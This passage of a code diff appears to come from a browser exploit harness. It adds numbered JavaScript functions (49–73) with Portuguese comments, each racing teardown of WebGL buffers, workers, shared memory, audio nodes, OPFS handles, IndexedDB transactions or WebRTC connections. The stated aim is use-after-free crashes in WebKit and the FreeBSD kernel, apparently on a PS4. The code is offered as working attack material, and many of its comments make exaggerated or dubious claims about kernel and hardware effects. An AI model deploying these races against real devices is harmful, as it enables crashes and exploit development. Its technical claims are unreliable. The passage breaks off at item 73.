+        // permite que a GPU grave resultados de cálculos diretamente em um buffer de memória física.
+        function runWebGL2TransformFeedbackRace() {
+            log("[GPU/Driver] Iniciando TransformFeedback VRAM Race...");
+            
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl2');
+            if (!gl) return log("[GPU] WebGL2 não suportado.");
+
+            try {
+                let tf = gl.createTransformFeedback();
+                gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
+                
+                let buffer = gl.createBuffer();
+                gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER, buffer);
+                gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, 1024 * 1024 * 5, gl.DYNAMIC_COPY);
+                gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, buffer);
+                
+                // Inicia a escrita direta de hardware (GPU escrevendo na VRAM)
+                gl.beginTransformFeedback(gl.POINTS);
+                
+                // Destrói brutalmente o buffer na camada C++ enquanto a GPU ainda está gravando
+                gl.deleteBuffer(buffer);
+                gl.deleteTransformFeedback(tf);
+                
+                log("[GPU/Driver] Buffer C++ deletado enquanto a GPU gravava dados (VRAM UAF).");
+            } catch(e) {
+                log("[GPU/Driver] Erro de hardware interceptado: " + e.message);
+            }
+        }
+
+        // --- 50. IPC Shared Memory munmap Teardown ---
+        // Alvo: O VMM do FreeBSD e o mecanismo de roteamento IPC do WebKit.
+        // Tenta transferir um SAB (SharedArrayBuffer) pelo MessagePort e fechar o canal 
+        // no exato momento do mapeamento físico de memória.
+        function runMessagePortSharedMemoryTeardown() {
+            log("[FreeBSD/IPC] Iniciando munmap Teardown via IPC...");
+            
+            let mc = new MessageChannel();
+            let sab = new SharedArrayBuffer(1024 * 1024 * 5); // 5MB
+            
+            let workerCode = `
+                onmessage = function(e) {
+                    // Tenta acessar a memória fisicamente no worker filho
+                    let view = new Uint8Array(e.data);
+                    view[0] = 1;
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            // Dispara o buffer compartilhado pelo canal IPC
+            w.postMessage(sab, [mc.port2]);
+            
+            // O WebKit está dizendo ao kernel: "Mapeie essa memória física para a nova thread".
+            // Nós interrompemos o processo fechando a porta e matando a thread.
+            // Isso pode forçar o FreeBSD a executar um munmap() em memória que ainda está sendo roteada.
+            mc.port1.close();
+            w.terminate();
+            
+            log("[FreeBSD/IPC] Rota de memória compartilhada destruída abruptamente.");
+        }
+// --- 51. WebTransport QUIC/UDP Socket Race ---
+        // Alvo: Pilha de rede nativa (Sockets UDP/QUIC).
+        // Diferente do WebRTC e WebSockets, o WebTransport usa QUIC, que tem uma 
+        // implementação complexa no nível do C++/Kernel. Vamos iniciar um DatagramWriter
+        // e destruir o transporte imediatamente.
+        function runWebTransportQUICRace() {
+            log("[Net/QUIC] Iniciando WebTransport Datagram Race...");
+            if (typeof WebTransport === 'undefined') return log("[Net] WebTransport não suportado.");
+
+            try {
+                // Tenta conectar a um endpoint inexistente, mas a engine aloca o socket UDP localmente
+                let wt = new WebTransport("https://127.0.0.1:4433/quic");
+                
+                wt.ready.catch(() => {}); // Ignora falha de conexão natural
+                
+                // Força a criação do DatagramWriter C++
+                let writer = wt.datagrams.writable.getWriter();
+                let buffer = new Uint8Array(1024 * 1024); // 1MB payload
+                
+                // Dispara a escrita (envia para o buffer do socket do FreeBSD)
+                writer.write(buffer).catch(()=>{});
+                
+                // Fecha a conexão QUIC de forma violenta, forçando o kernel a descartar a fila UDP
+                wt.close();
+                writer.releaseLock();
+                wt = null;
+                
+                log("[Net/QUIC] Socket UDP abortado durante serialização de datagrama.");
+            } catch(e) {
+                log("[Net/QUIC] Erro (Pode exigir flag ativa): " + e.message);
+            }
+        }
+
+        // --- 52. HID Gamepad Haptic Driver Teardown ---
+        // Alvo: Drivers HID (Human Interface Device) do PS4.
+        // A API de vibração (haptics) manda sinais de força diretamente para o driver nativo.
+        // Iniciar um efeito longo e anular o gamepad orfana o comando de hardware.
+        function runGamepadHapticDriverRace() {
+            log("[Hardware/HID] Iniciando Gamepad Haptic Race...");
+            
+            let gamepads = navigator.getGamepads ? navigator.getGamepads() : [];
+            let pad = gamepads.find(g => g !== null && g.vibrationActuator);
+            
+            if (!pad) return log("[Hardware] Nenhum Gamepad com suporte a vibração detectado.");
+
+            try {
+                // Envia comando para o driver do controle vibrar intensamente por 5 segundos
+                pad.vibrationActuator.playEffect("dual-rumble", {
+                    startDelay: 0,
+                    duration: 5000,
+                    weakMagnitude: 1.0,
+                    strongMagnitude: 1.0
+                });
+                
+                // Tentativa de orfanar a referência C++ que controla o timer do efeito no SO
+                pad = null;
+                
+                log("[Hardware/HID] Comando de hardware enviado. Forçando desassociação do objeto...");
+            } catch(e) {
+                log("[Hardware/HID] Erro: " + e.message);
+            }
+        }
+
+        // --- 53. Wasm VMM Grow + Atomics.wait Panic ---
+        // Alvo: Virtual Memory Manager (VMM) e Escalador de Threads.
+        // Uma thread dorme no kernel aguardando um endereço de memória física.
+        // A thread principal remapeia essa mesma memória (mmap/grow) enquanto o kernel a vigia.
+        function runWasmMemoryGrowWaitRace() {
+            log("[VMM/TCB] Iniciando Wasm Grow + Wait Race...");
+            
+            try {
+                let memory = new WebAssembly.Memory({initial: 1, maximum: 10, shared: true});
+                let view = new Int32Array(memory.buffer);
+                
+                let workerCode = `
+                    onmessage = function(e) {
+                        let view = new Int32Array(e.data);
+                        // A thread entra em sleep profundo no kernel (pthread_cond_wait)
+                        // vigiando o endereço de memória física index 0.
+                        Atomics.wait(view, 0, 0); 
+                    };
+                `;
+                let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+                w.postMessage(memory.buffer);
+                
+                setTimeout(() => {
+                    // Remapeia as páginas físicas (munmap + mmap no kernel)
+                    memory.grow(5);
+                    
+                    // Instantaneamente mata o worker cujo TCB (Thread Control Block)
+                    // estava vigiando a página que acabou de ser remapeada.
+                    w.terminate();
+                    log("[VMM/TCB] Página física remapeada e thread vigia exterminada.");
+                }, 50);
+            } catch(e) {
+                log("[VMM/TCB] Erro: " + e.message);
+            }
+        }
+
+        // --- 54. OPFS WritableStream VFS Flush Race ---
+        // Alvo: Buffer de I/O do Virtual File System.
+        // O WritableStream faz "flush" em pedaços para o disco. Fechar o stream 
+        // abruptamente enquanto uma Promise pendente está escrevendo cria concorrência no Vnode.
+        function runFileSystemWritableStreamAbort() {
+            log("[FreeBSD/VFS] Iniciando WritableStream Flush Race...");
+            if (!navigator.storage || !navigator.storage.getDirectory) return log("[VFS] OPFS não suportado.");
+
+            (async () => {
+                try {
+                    let dir = await navigator.storage.getDirectory();
+                    let fileHandle = await dir.getFileHandle('flush_race.tmp', {create: true});
+                    let writable = await fileHandle.createWritable();
+                    
+                    let buffer = new Uint8Array(1024 * 1024 * 50); // 50MB
+                    
+                    // Inicia a gravação (I/O bloqueante no background)
+                    let writePromise = writable.write(buffer);
+                    
+                    // Manda abortar o Vnode no nível do sistema de arquivos instantaneamente
+                    writable.abort();
+                    
+                    writePromise.then(() => log("[VFS] Escrita concluída anomalia (deveria falhar)."))
+                                .catch(() => log("[VFS] Flush abortado com sucesso. SO lidando com resíduos."));
+                                
+                } catch(e) {
+                    log("[FreeBSD/VFS] Erro no VFS: " + e.message);
+                }
+            })();
+        }
+
+        // --- 55. PerformanceObserver C++ Tracing Death ---
+        // Alvo: O subsistema nativo de tracing/profiling do WebKit (usado internamente).
+        // Criar milhares de marcas de performance em um Worker e matá-lo enquanto o C++ 
+        // tenta coletar e despachar os eventos para a thread principal.
+        function runPerformanceObserverTeardown() {
+            log("[WebCore/C++] Iniciando PerformanceObserver Tracing Death...");
+            
+            let workerCode = `
+                onmessage = function() {
+                    // Flood de eventos de marcação no C++ core
+                    for(let i=0; i<50000; i++) {
+                        performance.mark("exploit_mark_" + i);
+                    }
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            let observer = new PerformanceObserver((list) => {
+                // Callback apenas para manter o C++ ocupado tentando rotear as mensagens
+            });
+            observer.observe({entryTypes: ["mark"]});
+            
+            // Dispara o flood
+            w.postMessage("start");
+            
+            // Corrida: A thread C++ de performance está varrendo a tabela de marcas
+            // do Worker. Destruímos o Worker brutalmente.
+            setTimeout(() => {
+                w.terminate();
+                observer.disconnect();
+                log("[WebCore/C++] Worker destruído durante varredura de tabelas de Performance.");
+            }, 10);
+        }
+// --- 56. WebRTC DTLS Transport Crypto Teardown ---
+        // Alvo: Máquina de estado criptográfico (DTLS) interagindo com a rede nativa.
+        // Tenta capturar a referência do transporte subjacente e destruir o objeto pai 
+        // durante a fase de negociação inicial.
+        function runWebRTCDTLSTeardown() {
+            log("[Net/Crypto] Iniciando DTLS Transport Teardown...");
+            try {
+                let pc = new RTCPeerConnection({iceServers: []});
+                pc.createDataChannel("dtls_race");
+                
+                pc.createOffer().then(offer => {
+                    pc.setLocalDescription(offer);
+                    
+                    // O transporte DTLS é inicializado em background C++
+                    let sender = pc.getSenders()[0];
+                    let transport = sender ? sender.transport : null;
+                    
+                    // Fechamento abrupto enquanto a thread de rede do SO tenta alocar buffers de criptografia
+                    pc.close();
+                    pc = null;
+                    
+                    if(transport) {
+                        log("[Net/Crypto] Acesso ao transporte DTLS após fechamento do PC.");
+                        // Tentativa de acessar propriedades de um transporte cujas estruturas nativas foram limpas
+                        try { let state = transport.state; } catch(e) {}
+                    }
+                });
+            } catch(e) {
+                log("[Net/Crypto] Erro: " + e.message);
+            }
+        }
+
+        // --- 57. Wasm Memory Grow + IPC Transfer Race ---
+        // Alvo: VMM (Virtual Memory Manager) e o sistema de IPC (Inter-Process Communication).
+        // Dispara o crescimento (remapeamento) de uma memória física Wasm e, no exato mesmo frame,
+        // tenta transferir a propriedade (ownership) dessa memória para outro processo/thread.
+        function runWasmIPCMemoryTransferRace() {
+            log("[VMM/IPC] Iniciando Wasm Grow + IPC Transfer Race...");
+            try {
+                let memory = new WebAssembly.Memory({initial: 1, maximum: 50});
+                let w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(){}"], {type:"text/javascript"})));
+                
+                // Pede ao FreeBSD para realocar páginas físicas
+                memory.grow(5);
+                
+                // Manda o C++ arrancar o buffer do contexto atual e enviar via IPC
+                // Isso cria uma corrida severa entre a syscall mmap/mremap e a engine de serialização.
+                w.postMessage(memory.buffer, [memory.buffer]);
+                w.terminate();
+                
+                log("[VMM/IPC] Transferência de IPC enviada durante remapeamento de VMM.");
+            } catch(e) {
+                log("[VMM/IPC] Corrida mitigada pelo motor JS: " + e.message);
+            }
+        }
+
+        // --- 58. ImageBitmap VRAM IPC Routing UAF ---
+        // Alvo: Gerenciador de VRAM (memória de vídeo) e tabelas de roteamento IPC.
+        // Cria uma textura na placa de vídeo, transfere o ponteiro via IPC e destrói 
+        // a textura na thread principal concorrentemente.
+        function runImageBitmapIPCGCRace() {
+            log("[GPU/IPC] Iniciando VRAM IPC Routing UAF...");
+            let canvas = document.createElement('canvas');
+            canvas.width = 512; canvas.height = 512;
+            
+            createImageBitmap(canvas).then(bitmap => {
+                let mc = new MessageChannel();
+                let w = new Worker(URL.createObjectURL(new Blob(["onmessage=function(e){}"], {type:"text/javascript"})));
+                
+                w.postMessage("init", [mc.port2]);
+                
+                // Transfere o ponteiro da VRAM para o Worker via MessagePort
+                mc.port1.postMessage({bmp: bitmap}, [bitmap]);
+                
+                // Corrida: Tentativa explícita de desalocar a VRAM no C++ enquanto
+                // o driver IPC ainda está construindo a mensagem.
+                try { bitmap.close(); } catch(e) {}
+                
+                mc.port1.close();
+                w.terminate();
+                
+                log("[GPU/IPC] Ponteiro VRAM roteado e textura destruída simultaneamente.");
+            });
+        }
+
+        // --- 59. AudioWorklet kthread Atomics Collision ---
+        // Alvo: Escalador de kthreads do FreeBSD e controle de Futex/Atomics.
+        // Trava a kthread de áudio (prioridade real-time) com uma syscall de wait, e 
+        // manda o sinal de suspensão do dispositivo de hardware simultaneamente.
+        function runAudioWorkletAtomicsPanic() {
+            log("[FreeBSD/kthread] Iniciando Atomics Collision em Tempo Real...");
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                let sab = new SharedArrayBuffer(1024);
+                let view = new Int32Array(sab);
+                
+                let blob = new Blob([`
+                    class Exploit extends AudioWorkletProcessor {
+                        constructor() {
+                            super();
+                            this.port.onmessage = (e) => {
+                                let view = new Int32Array(e.data);
+                                // Trava a thread do kernel de áudio nativa
+                                Atomics.wait(view, 0, 0, 2000); 
+                            };
+                        }
+                        process() { return true; }
+                    }
+                    registerProcessor('exploit', Exploit);
+                `], {type: 'application/javascript'});
+                
+                ctx.audioWorklet.addModule(URL.createObjectURL(blob)).then(() => {
+                    let node = new AudioWorkletNode(ctx, 'exploit');
+                    node.port.postMessage(sab);
+                    
+                    // Dá uma fração de milissegundo para a kthread entrar na syscall bloqueante
+                    setTimeout(() => {
+                        // Acorda a thread no nível do Atomics e suspende o hardware de áudio no driver
+                        Atomics.notify(view, 0, 1);
+                        ctx.suspend();
+                        ctx.close();
+                        log("[FreeBSD/kthread] Hardware suspenso enquanto kthread era acordada do Atomics.");
+                    }, 5);
+                });
+            } catch(e) {
+                log("[FreeBSD/kthread] API não suportada ou erro: " + e.message);
+            }
+        }
+
+        // --- 60. BroadcastChannel Blob VFS Revocation ---
+        // Alvo: Gerenciador do Virtual File System (VFS) multi-processo.
+        // Envia um descritor de arquivo (Blob URL) para múltiplos ouvintes no SO
+        // e revoga o arquivo central antes que o C++ distribua os mapeamentos.
+        function runBroadcastBlobVFSTeardown() {
+            log("[VFS/IPC] Iniciando Broadcast VFS Revocation...");
+            if (typeof BroadcastChannel === 'undefined') return log("[VFS] BroadcastChannel não suportado.");
+
+            let bc = new BroadcastChannel('vfs_exploit_channel');
+            let data = new Uint8Array(1024 * 1024 * 10).fill(0x41); // 10MB
+            let blob = new Blob([data]);
+            let url = URL.createObjectURL(blob);
+            
+            // Dispara a URL para qualquer processo ouvindo o canal
+            bc.postMessage({fileUrl: url});
+            
+            // Corrida letal: O WebKit pede ao FreeBSD para invalidar o vnode associado
+            // enquanto o despachante IPC está copiando a string da URL para outros processos.
+            URL.revokeObjectURL(url);
+            bc.close();
+            
+            log("[VFS/IPC] Vnode revogado logo após broadcast multi-processo.");
+        }
+// --- 61. OPFS vnode Truncate/Close Race ---
+        // Alvo: O Virtual File System (VFS) do FreeBSD.
+        // O WebKit mapeia o SyncAccessHandle para um vnode no kernel. 
+        // Truncar o arquivo (alterar seu tamanho físico no disco) e fechá-lo
+        // simultaneamente cria uma corrida no bloqueio de inode do SO.
+        function runOPFSTruncateRace() {
+            log("[FreeBSD/VFS] Iniciando OPFS vnode Truncate Race...");
+            if (!navigator.storage || !navigator.storage.getDirectory) return log("[VFS] OPFS não suportado.");
+
+            let workerCode = `
+                onmessage = async function() {
+                    try {
+                        let dir = await navigator.storage.getDirectory();
+                        let handle = await dir.getFileHandle('truncate_race.tmp', {create: true});
+                        let syncHandle = await handle.createSyncAccessHandle();
+                        
+                        // Escreve dados iniciais
+                        syncHandle.write(new Uint8Array(1024 * 1024 * 5)); // 5MB
+                        
+                        // Corrida: Pede ao FreeBSD para truncar o arquivo para 0 bytes
+                        // e imediatamente fecha o descritor de arquivo.
+                        syncHandle.truncate(0);
+                        syncHandle.close();
+                        
+                    } catch(err) {}
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            w.postMessage("start");
+            
+            // Extermina a thread enquanto o C++ aguarda o retorno da syscall do FreeBSD
+            setTimeout(() => {
+                w.terminate();
+                log("[FreeBSD/VFS] Worker exterminado durante truncate/close concorrente.");
+            }, 3);
+        }
+
+        // --- 62. OffscreenCanvas VRAM Steal Teardown ---
+        // Alvo: Gerenciamento de DMA da Placa de Vídeo.
+        // Transfere um canvas para um worker, manda a GPU desenhar nele, e na mesma
+        // fração de segundo tenta "roubar" o buffer de volta chamando transferToImageBitmap.
+        function runOffscreenVRAMStealRace() {
+            log("[GPU/Driver] Iniciando Offscreen VRAM Steal...");
+            if (typeof OffscreenCanvas === 'undefined') return log("[GPU] OffscreenCanvas não suportado.");
+
+            let canvas = document.createElement('canvas');
+            canvas.width = 1024; canvas.height = 1024;
+            let offscreen = canvas.transferControlToOffscreen();
+            
+            let workerCode = `
+                onmessage = function(e) {
+                    let osc = e.data;
+                    let ctx = osc.getContext('2d');
+                    ctx.fillStyle = 'red';
+                    ctx.fillRect(0, 0, 1024, 1024); // Despacha para a GPU
+                    
+                    // Tenta arrancar o buffer da VRAM de volta para o main thread
+                    // no exato momento em que a thread compositora está enviando para a tela
+                    try {
+                        let bitmap = osc.transferToImageBitmap();
+                        postMessage(bitmap, [bitmap]);
+                    } catch(err) {}
+                };
+            `;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            w.postMessage(offscreen, [offscreen]);
+            
+            setTimeout(() => {
+                w.terminate();
+                log("[GPU/Driver] Thread compositora destruída durante o roubo do buffer VRAM.");
+            }, 5);
+        }
+
+        // --- 63. FinalizationRegistry IPC Socketpair Death ---
+        // Alvo: O Coletor de Lixo (GC) do WebCore interagindo com sockets FreeBSD.
+        // Usa a API de FinalizationRegistry para detectar quando o GC limpa um objeto,
+        // e tenta forçar o fechamento de um MessageChannel durante a interrupção do GC.
+        function runFinalizationRegistryIPCRace() {
+            log("[WebCore/GC] Iniciando FinalizationRegistry IPC Death...");
+            if (typeof FinalizationRegistry === 'undefined') return log("[GC] FinalizationRegistry não suportado.");
+
+            let mc = new MessageChannel();
+            
+            // O registro será chamado pela thread do GC (background C++ thread)
+            const registry = new FinalizationRegistry(heldValue => {
+                if(heldValue === "port_target") {
+                    try { mc.port1.close(); } catch(e){}
+                }
+            });
+            
+            // Escopo isolado para forçar a coleta
+            (() => {
+                let target = { port: mc.port2 };
+                registry.register(target, "port_target");
+                
+                // Roteia o socket no nível do kernel
+                mc.port1.postMessage("init", [target.port]);
+                
+                target = null; // Remove a referência
+            })();
+            
+            // Força pressão de memória absurda para invocar o GC do C++ imediatamente
+            let pressure = [];
+            for(let i=0; i<10000; i++) pressure.push(new ArrayBuffer(1024 * 1024));
+            
+            log("[WebCore/GC] Pressão de memória aplicada. Aguardando GC colidir com o socketpair IPC.");
+        }
+
+        // --- 64. WebAudio Convolver SIMD DSP Teardown ---
+        // Alvo: Processamento Digital de Sinais (DSP) e instruções SIMD da CPU.
+        // O ConvolverNode executa cálculos matemáticos pesadíssimos de matriz em C++ 
+        // otimizados para a arquitetura da CPU. Destruir o buffer de áudio no meio 
+        // do cálculo corrompe os registradores físicos do processador.
+        function runWebAudioSIMDTeardown() {
+            log("[CPU/DSP] Iniciando Convolver SIMD Teardown...");
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                let convolver = ctx.createConvolver();
+                
+                // Cria um buffer de impulso gigante para manter o DSP ocupado
+                let length = ctx.sampleRate * 3; // 3 segundos
+                let impulse = ctx.createBuffer(2, length, ctx.sampleRate);
+                
+                for (let i = 0; i < length; i++) {
+                    impulse.getChannelData(0)[i] = Math.random() * 2 - 1;
+                    impulse.getChannelData(1)[i] = Math.random() * 2 - 1;
+                }
+                
+                // Atribui o buffer, disparando a otimização SIMD no C++
+                convolver.buffer = impulse;
+                
+                // Corrida: Tenta invalidar o objeto e suspender o hardware enquanto
+                // os núcleos da CPU processam a convolução nas background pthreads.
+                convolver.disconnect();
+                convolver.buffer = null;
+                ctx.suspend();
+                
+                log("[CPU/DSP] Buffer de impulso removido durante cálculo SIMD nativo.");
+            } catch(e) {
+                log("[CPU/DSP] Erro: " + e.message);
+            }
+        }
+
+        // --- 65. MediaStreamTrack Hardware Signal Race ---
+        // Alvo: Sinais de Hardware e Subsistema de Câmera/Microfone.
+        // Tenta capturar uma trilha de mídia "falsa" (ou real, se conectada) e mandar o sinal
+        // de "stop" (desligar hardware) exatamente quando o WebRTC tenta ler o ponteiro físico.
+        function runMediaStreamTrackHardwareRace() {
+            log("[Hardware/Media] Iniciando MediaStreamTrack Signal Race...");
+            
+            let canvas = document.createElement('canvas');
+            let stream = canvas.captureStream(60); // 60 FPS
+            let track = stream.getVideoTracks()[0];
+            
+            let pc = new RTCPeerConnection({iceServers: []});
+            
+            // Adiciona a trilha ao PC, forçando o C++ a preparar o encoder de vídeo nativo
+            pc.addTrack(track, stream);
+            
+            pc.createOffer().then(offer => {
+                pc.setLocalDescription(offer);
+                
+                // Manda o sinal de interrupção direto para o gerenciador de hardware
+                track.stop();
+                
+                // Destrói a conexão que estava tentando encapsular os pacotes da câmera
+                pc.close();
+                
+                log("[Hardware/Media] Hardware de captura interrompido durante encoding WebRTC.");
+            }).catch(e => log("[Hardware/Media] Falha na oferta: " + e.message));
+        }
+// --- 66. IndexedDB SQLite VFS Transaction Death ---
+        // Alvo: O motor SQLite do WebKit interagindo com o sistema de arquivos (VFS) do FreeBSD.
+        // Iniciar uma transação massiva e mandar fechar a database no meio da escrita em disco.
+        function runIDBSQLiteTransactionDeath() {
+            log("[VFS/SQLite] Iniciando IDB Transaction Death...");
+            let req = indexedDB.open("ExploitDB_V15", 1);
+            
+            req.onupgradeneeded = (e) => {
+                let db = e.target.result;
+                if(!db.objectStoreNames.contains("vfs_store")) db.createObjectStore("vfs_store");
+            };
+            
+            req.onsuccess = (e) => {
+                let db = e.target.result;
+                let tx = db.transaction("vfs_store", "readwrite");
+                let store = tx.objectStore("vfs_store");
+                
+                // ArrayBuffer padrão gigantesco para forçar paginação no SQLite
+                let payload = new ArrayBuffer(1024 * 1024 * 50); // 50MB
+                store.put(payload, "heavy_key");
+                
+                // Corrida: A thread de I/O em background (C++) está gravando no disco.
+                // Destruímos a transação e fechamos a conexão com o arquivo instantaneamente.
+                tx.abort();
+                db.close();
+                
+                log("[VFS/SQLite] Transação de 50MB abortada e Vnode fechado concorrentemente.");
+            };
+        }
+
+        // --- 67. WebGL Pixel Buffer Object (PBO) VRAM Race ---
+        // Alvo: Controlador de DMA (Direct Memory Access) da GPU.
+        // Fazer upload assíncrono de textura via PBO e destruir o contexto C++ no meio da transferência.
+        function runWebGLPBOTeardown() {
+            log("[GPU/Driver] Iniciando WebGL PBO VRAM Race...");
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl2');
+            if (!gl) return log("[GPU] WebGL2 não suportado.");
+
+            // Buffer padrão de 20MB
+            let bufferData = new Uint8Array(1024 * 1024 * 20).fill(0x41); 
+            
+            let pbo = gl.createBuffer();
+            gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
+            gl.bufferData(gl.PIXEL_UNPACK_BUFFER, bufferData, gl.STREAM_DRAW);
+            
+            let texture = gl.createTexture();
+            gl.bindTexture(gl.TEXTURE_2D, texture);
+            
+            // Inicia o upload da memória RAM para a VRAM (Placa de vídeo)
+            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, 0);
+            
+            // Destrói as estruturas de controle no C++ antes do driver da GPU terminar a cópia
+            gl.deleteBuffer(pbo);
+            gl.deleteTexture(texture);
+            
+            // Tenta forçar a perda do contexto inteiro para invalidar o mapeamento de hardware
+            let ext = gl.getExtension('WEBGL_lose_context');
+            if(ext) ext.loseContext();
+            
+            log("[GPU/Driver] PBO e Textura deletados durante transferência de DMA.");
+        }
+
+        // --- 68. WebRTC TCP Socket Handshake Teardown ---
+        // Alvo: Pilha de rede TCP nativa do FreeBSD.
+        // Força o WebRTC a tentar abrir conexões TCP e destrói o C++ durante o "SYN/ACK".
+        function runWebRTCTCPNetworkRace() {
+            log("[Net/TCP] Iniciando TCP Socket Handshake Teardown...");
+            try {
+                // Força o uso de TCP (iceTransportPolicy) para bater diretamente na state machine do kernel
+                let pc = new RTCPeerConnection({
+                    iceServers: [{urls: "stun:stun.l.google.com:19302"}],
+                    iceTransportPolicy: "relay" 
+                });
+                
+                pc.createDataChannel("tcp_race");
+                
+                pc.createOffer().then(offer => {
+                    pc.setLocalDescription(offer);
+                    
+                    // O kernel começa a alocar sockets TCP e buffers de rede
+                    setTimeout(() => {
+                        // Fecha o descritor abruptamente. O C++ avisa o FreeBSD para enviar um pacote RST,
+                        // mas se as estruturas não estiverem sincronizadas, teremos um UAF no kqueue.
+                        pc.close();
+                        pc = null;
+                        log("[Net/TCP] Objeto nativo WebRTC destruído durante alocação de sockets TCP.");
+                    }, 5);
+                });
+            } catch(e) {
+                log("[Net/TCP] Erro: " + e.message);
+            }
+        }
+
+        // --- 69. WebAudio AnalyserNode FFT DSP Teardown ---
+        // Alvo: Processador Digital de Sinais (DSP) executando a Fast Fourier Transform.
+        // Pedir para o C++ calcular o espectro de frequência e destruir o nó na mesma chamada de CPU.
+        function runAudioAnalyserFFTTeardown() {
+            log("[CPU/DSP] Iniciando AnalyserNode FFT Teardown...");
+            try {
+                let ctx = new (window.AudioContext || window.webkitAudioContext)();
+                let analyser = ctx.createAnalyser();
+                let osc = ctx.createOscillator();
+                
+                analyser.fftSize = 32768; // Tamanho máximo de FFT para travar a CPU ao máximo
+                osc.connect(analyser);
+                osc.start(0);
+                
+                let dataArray = new Float32Array(analyser.frequencyBinCount);
+                
+                // Manda a thread de áudio nativa calcular a Transformada de Fourier
+                analyser.getFloatFrequencyData(dataArray);
+                
+                // Desconecta tudo e suspende o hardware enquanto a matemática rola nos bastidores C++
+                osc.disconnect();
+                analyser.disconnect();
+                ctx.suspend();
+                
+                log("[CPU/DSP] DSP interrompido durante cálculo nativo de FFT (32k bins).");
+            } catch(e) {
+                log("[CPU/DSP] Erro: " + e.message);
+            }
+        }
+
+        // --- 70. Fetch ReadableStream PipeTo VFS Abort ---
+        // Alvo: Subsistema de Streams C++ e I/O de rede.
+        // Baixar um arquivo, transformar em stream e abortar a ponte de comunicação (Pipe).
+        function runFetchStreamPipeAbort() {
+            log("[Net/Streams] Iniciando Fetch Stream Pipe Abort...");
+            
+            // Blob local massivo para simular um download que preenche os buffers
+            let fakeData = new Uint8Array(1024 * 1024 * 30).fill(0x01); // 30MB
+            let blob = new Blob([fakeData]);
+            let url = URL.createObjectURL(blob);
+            
+            let abortController = new AbortController();
+            
+            fetch(url, { signal: abortController.signal }).then(res => {
+                let transform = new TransformStream();
+                
+                // Inicia o pipe (o C++ começa a mover blocos de memória do descritor de rede/arquivo para o stream)
+                let pipePromise = res.body.pipeTo(transform.writable);
+                
+                // Aborta a requisição original e o stream de destino instantaneamente
+                abortController.abort();
+                transform.writable.abort();
+                
+                pipePromise.catch(() => log("[Net/Streams] PipeTo C++ cancelado via interrupção de sinal."));
+            }).catch(() => {});
+        }
+ // --- 71. WebGL 1.0 VAO DMA Draw Race ---
+        // Alvo: O driver da GPU. O WebGL 1.0 usa a extensão VAO para gerenciar estados de vértices.
+        // Disparamos um comando de desenho massivo (gl.drawArrays) que a GPU processará de forma assíncrona,
+        // e no mesmo tick, mandamos o C++ deletar os buffers e invalidar o contexto.
+        function runWebGL1VAODrawRace() {
+            log("[GPU/WebGL1] Iniciando VAO Draw Race...");
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return log("[GPU] WebGL 1.0 não inicializado.");
+
+            // Tenta obter a extensão VAO clássica do WebGL 1.0
+            let vaoExt = gl.getExtension('OES_vertex_array_object');
+            if (!vaoExt) return log("[GPU] Extensão VAO não suportada.");
+
+            let vao = vaoExt.createVertexArrayOES();
+            vaoExt.bindVertexArrayOES(vao);
+
+            let buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            
+            // Aloca um buffer de 10MB na memória gráfica
+            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(1024 * 1024 * 2.5), gl.STATIC_DRAW);
+            gl.enableVertexAttribArray(0);
+            gl.vertexAttribPointer(0, 3, gl.FLOAT, false, 0, 0);
+
+            // Instrui o driver nativo a desenhar uma quantidade massiva de dados (DMA streaming)
+            gl.drawArrays(gl.TRIANGLES, 0, 1024 * 1024);
+
+            // Corrida letal: Destrói as referências C++ do VAO e do Buffer enquanto a GPU lê a memória
+            vaoExt.deleteVertexArrayOES(vao);
+            gl.deleteBuffer(buffer);
+            
+            let loseCtxExt = gl.getExtension('WEBGL_lose_context');
+            if (loseCtxExt) loseCtxExt.loseContext();
+
+            log("[GPU/WebGL1] Draw command enviado e VAO deletado simultaneamente.");
+        }
+
+        // --- 72. Blob IPC Vnode Routing Death ---
+        // Alvo: Tabela de File Descriptors (vnodes) do FreeBSD e IPC inter-processos.
+        // Diferente de um buffer, um Blob grande é um ponteiro para um arquivo no disco (vnode).
+        // Mandamos o C++ enviar esse vnode para outra thread e revogamos a URL base imediatamente.
+        function runBlobIPCVnodeRoutingDeath() {
+            log("[FreeBSD/VFS] Iniciando Blob IPC Vnode Death...");
+            
+            let dummyData = new Uint8Array(1024 * 1024 * 15).fill(0x11); // 15MB force disk spooling
+            let blob = new Blob([dummyData]);
+            let url = URL.createObjectURL(blob);
+            
+            let workerCode = `onmessage = function(e) { let b = e.data; };`;
+            let w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
+            
+            // O IPC (Inter-Process Communication) inicia o envio do mapeamento do arquivo nativo
+            w.postMessage(blob);
+            
+            // Pede ao VFS para descer a referência do arquivo (fdrop) enquanto a mensagem está em trânsito
+            URL.revokeObjectURL(url);
+            w.terminate();
+            
+            log("[FreeBSD/VFS] Vnode do Blob roteado via IPC e URL revogada na origem.");
+        }
+
+        // --- 73. Legacy ScriptProcessor kthread Teardown ---
+        // Alvo: Escalonamento de kthreads (kernel threads) e Audio DSP.
